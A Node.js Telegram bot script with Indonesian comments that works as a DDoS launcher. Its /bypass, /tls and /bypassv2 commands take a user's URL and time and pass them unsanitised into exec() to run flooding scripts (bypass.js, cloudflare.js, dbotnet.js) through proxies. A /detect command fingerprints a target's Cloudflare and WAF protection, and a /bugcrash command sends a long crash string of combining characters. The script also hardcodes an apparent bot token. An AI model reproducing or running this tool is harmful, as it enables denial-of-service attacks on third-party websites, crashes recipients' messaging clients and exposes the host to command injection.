const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Ganti dengan token bot Telegram Anda
const token = '8528308125:AAFCCVDlNwozNco6kYzHm0aXSzjKiCstQvE';

// Inisialisasi bot dengan token
const bot = new TelegramBot(token, { polling: true });

// Fungsi untuk mencatat aktivitas penggunaan bot di console log
function logActivity(msg) {
  const user = msg.from;
  const chat = msg.chat;
  const command = msg.text.toLowerCase();

  console.log(`Aktivitas Penggunaan Bot Telegram`);
  console.log(`• User ID: ${user.id}`);
  console.log(`• Username: ${user.username || 'Tidak ada'}`);
  console.log(`• Chat ID: ${chat.id}`);
  console.log(`• Perintah: ${command}`);
}

// Event listener untuk pesan dari pengguna
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const command = msg.text.toLowerCase();

  // Mencatat aktivitas penggunaan bot di console log
  logActivity(msg);

if (command.startsWith('/start')) {
bot.sendMessage(chatId, `Author @XinyouXD

command
/bypass
/tls
/detect
/http
/bugcrash`)
}
   
    if (command.startsWith('/bugcrash')) {
        bot.sendMessage(chatId, `👁️👁️
  👄✌️ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨ`)
    }
    

  // Menanggapi perintah /bypass
  if (command.startsWith('/bypass')) {
  // Mengekstrak argumen dari pesan
  const args = command.split(' ');
  const url = args[1];
  const time = args[2];

  // Memeriksa apakah format pesan benar
  if (args.length === 3 && url && time) {
    const rate = 80;
    const thread = 10;
    const proxy = 'proxy.txt';

    // Menjalankan file bypass.js dengan argumen yang diberikan
    const commands = [
      `node bypass.js ${url} ${time} ${rate} ${thread} ${proxy}`,
      `node gecko.js ${url} ${time} ${rate} ${thread} ${proxy}`,
      `node tls-arz.js ${url} ${time} ${rate} ${thread} ${proxy}`,
    ];

    commands.forEach((cmd) => {
      exec(cmd, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
      });
    });

    bot.sendMessage(chatId, 'Proses telah dimulai.');
  } else {
    // Memberi tahu pengguna bahwa format pesan tidak benar
    bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /bypass [url] [time]');
  }
}
    // Menanggapi perintah /tls
  if (command.startsWith('/tls')) {
  // Mengekstrak argumen dari pesan
  const args = command.split(' ');
  const url = args[1];
  const time = args[2];

  // Memeriksa apakah format pesan benar
  if (args.length === 3 && url && time) {
    const rate = 80;
    const thread = 10;
    const proxy = 'proxy.txt';

    // Menjalankan file tls.js dengan argumen yang diberikan
    const commands = [
      `node launching.js ${url} ${time} ${rate} ${thread} ${proxy}`,
      `node raw.js ${url} ${time} ${rate} ${thread} ${proxy}`,
      `node httpx.js ${url} ${time} ${rate} ${thread} ${proxy}`,
    ];

    commands.forEach((cmd) => {
      exec(cmd, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
      });
    });

    bot.sendMessage(chatId, 'Proses telah dimulai.');
  } else {
    // Memberi tahu pengguna bahwa format pesan tidak benar
    bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /tls [url] [time]');
  }
}
  // Menanggapi perintah /bypassv2
  if (command.startsWith('/bypassv2')) {
  // Mengekstrak argumen dari pesan
  const args = command.split(' ');
  const url = args[1];
  const time = args[2];

  // Memeriksa apakah format pesan benar
  if (args.length === 3 && url && time) {
    const rate = 80;
    const thread = 10;
    const proxy = 'proxy.txt';

    // Menjalankan file bypassv2.js dengan argumen yang diberikan
    const commands = [
      `node r9.js ${url} ${time} ${rate} ${thread} ${proxy}`,
      `node cloudflare.js ${url} ${time} ${rate} ${thread} ${proxy}`,
      `node dbotnet.js ${url} ${time} ${rate} ${thread} ${proxy}`,
    ];

    commands.forEach((cmd) => {
      exec(cmd, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        // Menampilkan output stdout jika berhasil
        console.log(`stdout: ${stdout}`);
      });
    });

    bot.sendMessage(chatId, 'Proses telah dimulai.');
  } else {
    // Memberi tahu pengguna bahwa format pesan tidak benar
    bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /bypassv2 [url] [time]');
  }
}
  
  if (command.startsWith('/http')) {
  const args = command.split(' ');
  const web = args[1];
  const url = `https://check-host.net/check-http?host=${web}&csrf_token=`;
      
  if (args.length === 2 && web) {
  bot.sendMessage(chatId, `Klik link di bawah untuk melihat hasil: ${url}`)
 } else {
     bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format : /http [url]')
 }
  }
});

bot.onText(/\/detect (https?:\/\/[^\s]+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const target = match[1];

    bot.sendMessage(chatId, `🔍 Checking protection on ${target}, please wait...`);

    try {
        const start = Date.now();
        const response = await axios.get(target, {
            httpsAgent: new https.Agent({ rejectUnauthorized: false }),
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
            },
            timeout: 10000
        });
        const end = Date.now();

        const responseTime = (end - start).toFixed(2);
        const headers = response.headers;
        const statusCode = response.status;

        let result = `🔍 <b>Protection Detection Results for:</b> <code>${target}</code>\n\n`;

        if (headers['server'] && headers['server'].toLowerCase().includes('cloudflare')) {
            result += `✅ <b>Cloudflare Detected</b>\n`;
        }
        
        if (headers['x-cdn'] || headers['x-cache'] || headers['cdn-cache']) {
            result += `🌐 <b>CDN Protection Detected</b>\n`;
        }

        if (statusCode === 403 || statusCode === 401) {
            result += `🛡️ <b>Access Denied (${statusCode}) - WAF/Proxy Detected</b>\n`;
        }

        if (headers['cf-challenge'] || headers['cf-ray']) {
            result += `🤖 <b>CAPTCHA Protection Detected</b>\n`;
        }

        try {
            const cert = await getSSLCertificate(target);
            if (cert) {
                result += `🔐 <b>SSL/TLS Enabled</b> - Issued by: <code>${cert}</code>\n`;
            }
        } catch (e) {
            result += `🔐 <b>SSL Certificate Check Failed</b>\n`;
        }

        result += `⏳ <b>Response Time:</b> ${responseTime} ms\n`;
        result += `📊 <b>Status Code:</b> ${statusCode}`;

        bot.sendMessage(chatId, result, { parse_mode: "HTML" });

    } catch (error) {
        if (error.response) {
            bot.sendMessage(chatId, 
                `🔍 <b>Website responded with error:</b>\n\n` +
                `📊 <b>Status Code:</b> ${error.response.status}\n` +
                `🛡️ <b>Likely has protection/WAF</b>\n` +
                `🔗 <b>Target:</b> ${target}`, 
                { parse_mode: "HTML" }
            );
        } else {
            bot.sendMessage(chatId, 
                `❌ <b>Failed to detect protection for:</b> ${target}\n` +
                `💡 <b>Error:</b> ${error.message}`, 
                { parse_mode: "HTML" }
            );
        }
    }
});